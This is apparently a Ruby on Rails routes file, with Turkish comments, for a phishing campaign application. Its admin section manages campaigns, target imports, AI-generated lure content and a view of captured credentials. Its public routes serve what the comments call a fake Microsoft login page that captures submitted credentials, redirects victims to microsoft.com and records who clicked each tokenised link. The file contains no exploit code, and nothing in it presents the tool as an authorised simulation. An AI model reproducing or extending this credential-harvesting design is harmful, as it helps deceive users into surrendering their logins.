Rails.application.routes.draw do
  # Health check
  get "up" => "rails/health#show", as: :rails_health_check

  # ---------------------------------------------------------------------------
  # Admin panel (React dashboard'un Rails karşılığı)
  # ---------------------------------------------------------------------------
  namespace :admin do
    root "dashboard#index"
    get "dashboard", to: "dashboard#index"

    resources :campaigns do
      member do
        post :send_now
        post :import_excel
        post :generate_ai_content
        post :add_target
        get :ai_status
      end
    end

    get "analytics", to: "analytics#index"
    get "credentials", to: "credentials#index"
  end

  # ---------------------------------------------------------------------------
  # Phishing front-end: sahte Microsoft login sayfası (eski auth.html karşılığı)
  # /auth          -> sahte login formu
  # POST /auth/login -> credential yakalama + microsoft.com'a redirect
  # Kampanya linki için track: /auth/:token ile kim tıkladığını kaydeder
  # ---------------------------------------------------------------------------
  get "auth", to: "auth#show", as: :auth
  get "auth/:token", to: "auth#show", as: :auth_with_token
  post "auth/login", to: "auth#login", as: :auth_login

  # Public landing (React'teki '/' yerine admin'e yönlendir)
  root to: redirect("/admin")
end
